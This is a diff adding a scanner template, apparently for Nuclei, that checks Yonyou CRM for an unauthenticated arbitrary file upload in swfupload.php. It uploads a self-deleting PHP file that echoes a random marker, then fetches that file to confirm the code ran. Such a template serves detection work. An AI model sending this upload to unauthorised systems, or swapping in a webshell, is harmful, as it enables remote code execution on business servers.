@@ -1,0 +1,58 @@
+id: wooyun-2015-0137238
+
+info:
+  name: 用友CRM swfupload任意文件上传
+  author: 折跃
+  description: |
+    用友CRM swfupload任意文件上传漏洞
+    用友CRM客户关系管理系统是一套基于B/S架构、互联网模式应用普及的信息化趋势，专为中小企业提供包括客户管理、销售管理、项目管理等应用的在线CRM。
+    用友CRM存在任意文件上传漏洞。远程攻击者可以利用该漏洞上传文件并执行代码。
+  severity: critical
+  tags: 用友-U8-CRM
+
+variables:
+  filename: '{{rand_text_alphanumeric(8,"")}}'
+  verify: '{{rand_text_alphanumeric(32,"")}}'
+
+http:
+  - raw:
+      - |
+        POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP
+        Cookie: PHPSESSID=ibru7pqnplhi720caq0ev8uvt0
+
+        ------WebKitFormBoundaryAVuAKsvesmnWtgEP
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo {{verify}};unlink(__FILE__);?>
+        ------WebKitFormBoundaryAVuAKsvesmnWtgEP
+        Content-Disposition: form-data; name="upload"
+
+        upload
+        ------WebKitFormBoundaryAVuAKsvesmnWtgEP--
+        
+    extractors:
+      - type: regex
+        name: uploadFile
+        regex:
+          - '(\w+.tmp.php)'
+        group: 1
+        part: body
+        internal: true
+
+  - raw:
+      - |
+        GET /tmpfile/{{uploadFile}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{verify}}'
+      - type: status
+        status:
+          - 200
